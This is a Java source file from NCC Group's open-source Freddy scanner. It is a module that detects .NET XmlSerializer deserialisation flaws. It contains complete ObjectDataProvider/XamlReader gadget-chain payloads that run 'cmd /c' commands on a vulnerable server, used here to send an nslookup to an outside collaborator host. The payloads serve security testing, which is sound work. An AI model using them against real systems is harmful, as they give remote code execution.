// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the .NET XmlSerializer API.
 *
 * Like DataContractSerializer, exploitation relies on
 * control of a type parameter however depending on the
 * target it may be possible to wrap the payload with a
 * root XML element which specifies the type to
 * deserialize as. This module includes both wrapped and
 * non-wrapped payloads.
 *
 * If the type is controlled, it needs to be set to:
 *  -> System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class XmlSerializerModule extends FreddyModuleBase {
    //Wrapped payload name
    private static final String PN_OBJDATPRO_WRAPPED = PN_OBJDATPRO + "_Wrapped";

    //ObjectDataProvider payload data
    private static final String OBJD_PREFIX = "<?xml version=\"1.0\"?><ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">&lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;&lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;System:String&gt;cmd&lt;/System:String&gt;&lt;System:String&gt;/c ";
    private static final String OBJD_SUFFIX = "&lt;/System:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;</anyType></MethodParameters><ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider>";
    private static final String OBJDW_PREFIX = "<?xml version=\"1.0\"?><root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfXamlReaderObjectDataProvider><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">&lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;&lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;System:String&gt;cmd&lt;/System:String&gt;&lt;System:String&gt;/c ";
    private static final String OBJDW_SUFFIX = "&lt;/System:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;</anyType></MethodParameters><ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider></root>";

    protected void initialiseModule() {
        setName("XmlSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("Note that exploitation relies on control of the type parameter to the " +
                "XmlSerializer constructor.");
        setRemediationDetail("");
        setSeverity(SeverityRating.MEDIUM);

        registerPassiveScanIndicator("GeneratedAssembly.XmlSerializationReader", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<test/>", "GeneratedAssembly.XmlSerializationReader");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
        registerActiveScanCollaboratorPayload(PN_OBJDATPRO_WRAPPED, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;

            case PN_OBJDATPRO_WRAPPED:
                return OBJDW_PREFIX + "nslookup " + hostname + OBJDW_SUFFIX;
        }
        return null;
    }
}
